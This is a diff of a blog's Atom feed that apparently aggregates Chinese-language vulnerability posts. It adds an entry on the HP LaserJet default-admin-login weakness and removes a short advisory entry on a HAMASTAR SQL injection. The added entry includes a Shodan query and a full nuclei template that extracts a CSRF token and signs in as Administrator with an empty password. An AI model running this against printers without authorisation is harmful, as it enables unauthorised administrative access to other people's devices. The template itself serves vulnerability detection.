@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-16T16:00:19.269Z</updated>
+  <updated>2025-06-16T16:45:13.139Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Hewlett Packard LaserJet Printer 默认登录漏洞</title>
+    <link href="http://example.com/2025/06/16/github_805511133/"/>
+    <id>http://example.com/2025/06/16/github_805511133/</id>
+    <published>2025-06-16T16:45:13.141Z</published>
+    <updated>2025-06-16T16:45:13.139Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Hewlett Packard LaserJet Printer 默认登录漏洞</p><p><strong>漏洞类型：</strong> 弱口令</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> HP打印机通常默认允许无需密码的管理员访问。这种行为使得任何人都可以无需认证就以管理员身份登录，可能暴露敏感设置或功能。</p><p><strong>产品厂商：</strong> Hewlett Packard</p><p><strong>产品名称：</strong> LaserJet Printer</p><p><strong>搜索语法：</strong> html:”hp&#x2F;device&#x2F;SignIn&#x2F;Index”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/ab558b0b3f1ce27914c34405f7237f5f502ab5bf/network%2Fdefault-login%2Fhp-printer%2Fhp-printer-default-login.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/ab558b0b3f1ce27914c34405f7237f5f502ab5bf/network%2Fdefault-login%2Fhp-printer%2Fhp-printer-default-login.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><br><span class="hljs-attribute">id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">hp-printer-default-login</span><br><br><span class="hljs-attribute">info</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Hewlett Packard LaserJet Printer - Default Login</span><br>  <span class="hljs-attribute">author</span><span class="hljs-punctuation">:</span> <span class="hljs-string">JohnAsbjorn</span><br>  <span class="hljs-attribute">severity</span><span class="hljs-punctuation">:</span> <span class="hljs-string">high</span><br>  <span class="hljs-attribute">description</span><span class="hljs-punctuation">:</span> <span class="hljs-string">|</span><br>    <span class="hljs-attribute">HP printers often allow administrative access without requiring a password by default. This behavior enables anyone to log in as the Administrator without authentication, potentially exposing sensitive settings or functions.</span><br><span class="hljs-attribute">  reference</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://h30434.www3.hp.com/t5/Printing-Errors-or-Lights-Stuck-Print-Jobs/What-is-the-user-name-and-password-in-Embedded-Web-Server/td-p/6165417</span><br>  <span class="hljs-attribute">metadata</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">verified</span><span class="hljs-punctuation">:</span> <span class="hljs-string">true</span><br>    <span class="hljs-attribute">shodan-query</span><span class="hljs-punctuation">:</span> <span class="hljs-string">html:&quot;hp/device/SignIn/Index&quot;</span><br>    <span class="hljs-attribute">max-request</span><span class="hljs-punctuation">:</span> <span class="hljs-string">2</span><br>  <span class="hljs-attribute">tags</span><span class="hljs-punctuation">:</span> <span class="hljs-string">hp,printer,default-login</span><br><br><span class="hljs-attribute">http</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">raw:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|</span><br>        <span class="hljs-attribute">GET /hp/device/SignIn/Index HTTP/1.1</span><br><span class="hljs-attribute">        Host</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#123;&#123;Hostname&#125;&#125;</span><br>        <span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">:</span> <span class="hljs-string">identity</span><br>        <span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">:</span> <span class="hljs-string">en</span><br><br>    <span class="hljs-attribute">extractors</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: regex</span><br>        <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">token</span><br>        <span class="hljs-attribute">part</span><span class="hljs-punctuation">:</span> <span class="hljs-string">body</span><br>        <span class="hljs-attribute">group</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1</span><br>        <span class="hljs-attribute">regex</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;id=&quot;CSRFToken&quot; name=&quot;CSRFToken&quot; value=&quot;([^&quot;]+)&quot;&#x27;</span><br>        <span class="hljs-attribute">internal</span><span class="hljs-punctuation">:</span> <span class="hljs-string">true</span><br><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">raw:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|</span><br>        <span class="hljs-attribute">POST /hp/device/SignIn/Index HTTP/1.1</span><br><span class="hljs-attribute">        Host</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#123;&#123;Hostname&#125;&#125;</span><br>        <span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">:</span> <span class="hljs-string">identity</span><br>        <span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">:</span> <span class="hljs-string">application/x-www-form-urlencoded</span><br>        <span class="hljs-attribute">Origin</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#123;&#123;RootURL&#125;&#125;</span><br>        <span class="hljs-attribute">Referer</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#123;&#123;RootURL&#125;&#125;/hp/device/SignIn/Index</span><br><br>        <span class="hljs-attribute">CSRFToken=&#123;&#123;token&#125;&#125;&amp;agentIdSelect=hp_EmbeddedPin_v1&amp;PinDropDown=AdminItem&amp;PasswordTextBox=&amp;signInOk=Sign+In</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">    redirects</span><span class="hljs-punctuation">:</span> <span class="hljs-string">true</span><br>    <span class="hljs-attribute">max-redirects</span><span class="hljs-punctuation">:</span> <span class="hljs-string">2</span><br><br>    <span class="hljs-attribute">matchers-condition</span><span class="hljs-punctuation">:</span> <span class="hljs-string">or</span><br>    <span class="hljs-attribute">matchers</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: word</span><br>        <span class="hljs-attribute">part</span><span class="hljs-punctuation">:</span> <span class="hljs-string">body</span><br>        <span class="hljs-attribute">words</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;User: Administrator&quot;</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;Sign out&quot;</span><br>        <span class="hljs-attribute">condition</span><span class="hljs-punctuation">:</span> <span class="hljs-string">and</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: regex</span><br>        <span class="hljs-attribute">part</span><span class="hljs-punctuation">:</span> <span class="hljs-string">header</span><br>        <span class="hljs-attribute">regex</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;Set-Cookie: .*session.*&#x27;</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: status</span><br>        <span class="hljs-attribute">status</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">200</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Hewlett Packard LaserJet Printer 默认登录漏洞</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="弱口令" scheme="http://example.com/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/"/>
+    
+  </entry>
   
   <entry>
     <title>Peplink Captive Portal 未授权配置上传漏洞</title>
@@ -520,30 +546,6 @@
     <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
     <category term="安恒信息CERT" scheme="http://example.com/tags/%E5%AE%89%E6%81%92%E4%BF%A1%E6%81%AFCERT/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>The WIMP website co-construction management platform from HAMASTAR Technology has a SQL Injection</title>
-    <link href="http://example.com/2025/06/16/github_3623154437/"/>
-    <id>http://example.com/2025/06/16/github_3623154437/</id>
-    <published>2025-06-16T10:00:06.380Z</published>
-    <updated>2025-06-16T10:00:06.378Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-gpg7-49w7-q7wr">https://github.com/advisories/GHSA-gpg7-49w7-q7wr</a></p><p><strong>CVSS 评分：</strong> 9.8</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-6169">https://nvd.nist.gov/vuln/detail/CVE-2025-6169</a></p></li><li><p><a href="https://www.twcert.org.tw/en/cp-139-10184-f29ca-2.html">https://www.twcert.org.tw/en/cp-139-10184-f29ca-2.html</a></p></li><li><p><a href="https://www.twcert.org.tw/tw/cp-132-10183-99ce1-1.html">https://www.twcert.org.tw/tw/cp-132-10183-99ce1-1.html</a></p></li><li><p><a href="https://github.com/advisories/GHSA-gpg7-49w7-q7wr">https://github.com/advisories/GHSA-gpg7-49w7-q7wr</a></p></li></ul><p><strong>描述：</strong></p><p>The WIMP website co-construction management platform from HAMASTAR Technology has a SQL Injection vulnerability, allowing unauthenticated remote attackers to inject arbitrary SQL commands to read, modify, and delete database contents.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-gpg7-49w7-q7wr&quot;&gt;https://github.com/advisories/GHSA-gpg7-49w7-q7wr&lt;/a&gt;&lt;/p</summary>
-      
-    
-    
-    
-    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
-    
-    
-    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
     
   </entry>
   
